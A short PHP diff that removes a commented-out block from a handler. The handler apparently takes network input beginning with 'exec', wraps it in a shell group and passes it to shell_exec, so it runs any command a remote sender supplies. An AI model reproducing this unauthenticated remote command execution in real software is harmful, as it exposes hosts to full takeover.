@@ -43,12 +43,6 @@
 	    	if(preg_match('/^(exec)\s/', $recv, $matches, PREG_OFFSET_CAPTURE))
 	    	{
     			$full_cmd = "{ ".preg_replace('/(;)+(\s)*/', ';', trim(substr($recv, 4)));
-				/*if(substr($full_cmd, -1) !== ';')
-					$full_cmd .= ";";
-
-				$full_cmd .= " } 2>&1;";*/
-
-
 				$full_cmd .= substr($full_cmd, -1) !== ';' ? "; } 2>&1;" : " } 2>&1;";
 
 				if(!($result = shell_exec($full_cmd)))
